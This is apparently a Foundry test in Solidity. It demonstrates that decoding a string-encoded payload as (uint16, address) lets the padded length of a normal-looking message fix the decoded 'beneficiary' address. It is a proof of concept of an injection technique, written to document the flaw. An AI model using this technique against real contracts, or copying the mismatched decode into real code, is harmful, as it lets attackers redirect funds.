// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;
import { Test } from "forge-std/Test.sol";
import { console2 } from "forge-std/console2.sol";

/// @notice Proves the phantom-address mechanism is precisely, deliberately
/// controllable: a naive (uint16,address) decode of a string payload reads
/// the string's LENGTH as the address, not its content. An attacker can
/// therefore choose ANY target address (up to the sane range) purely by
/// padding an otherwise completely normal, human-readable message to the
/// exact right character count - no special bytes required at all.
contract RealLengthControlledAddressInjection is Test {
    function test_INJECTION_MessageLengthControlsPhantomAddress() public {
        // Target: attacker wants the phantom-decoded "beneficiary" to be
        // exactly this address. Small, human-checkable value for the demo.
        address TARGET_PHANTOM_ADDRESS = address(0x1234);
        uint256 requiredLength = uint256(uint160(TARGET_PHANTOM_ADDRESS));

        console2.log("Target phantom address:", TARGET_PHANTOM_ADDRESS);
        console2.log("Required message length in bytes:", requiredLength);

        // Craft a perfectly normal, readable message and pad it (with
        // trailing spaces - completely unremarkable to a human or a
        // correct string-decoder) to EXACTLY the required length.
        string memory baseMessage = "ich bin kellner, du bist studiert";
        bytes memory baseBytes = bytes(baseMessage);
        require(baseBytes.length <= requiredLength, "base message too long for this demo target");

        bytes memory padded = new bytes(requiredLength);
        for (uint256 i = 0; i < baseBytes.length; i++) {
            padded[i] = baseBytes[i];
        }
        for (uint256 i = baseBytes.length; i < requiredLength; i++) {
            padded[i] = " ";
        }
        string memory craftedMessage = string(padded);

        bytes memory encoded = abi.encode(craftedMessage);

        console2.log("Crafted message length:", bytes(craftedMessage).length);

        (uint16 phantomDepth, address phantomBeneficiary) = this.decodeAsTuple(encoded);

        console2.log("=== GROUND TRUTH ===");
        console2.log("Phantom depth decoded (always 32 for single-string payloads):", phantomDepth);
        console2.log("Phantom beneficiary decoded:", phantomBeneficiary);
        console2.log("Target phantom address was:  ", TARGET_PHANTOM_ADDRESS);

        assertEq(phantomDepth, 32, "confirms depth is ALWAYS the offset word, universally, for any single-string payload");
        assertEq(phantomBeneficiary, TARGET_PHANTOM_ADDRESS, "CONFIRMED: attacker controls the phantom address EXACTLY, purely via message length");

        console2.log("!!!!! CONFIRMED: a completely normal-looking, human-readable message !!!!!");
        console2.log("!!!!! deterministically controls a mismatched-decoder's extracted address !!!!!");
        console2.log("!!!!! via character count alone - no special bytes needed at all !!!!!");
    }

    function decodeAsTuple(bytes calldata data) external pure returns (uint16, address) {
        return abi.decode(data, (uint16, address));
    }
}
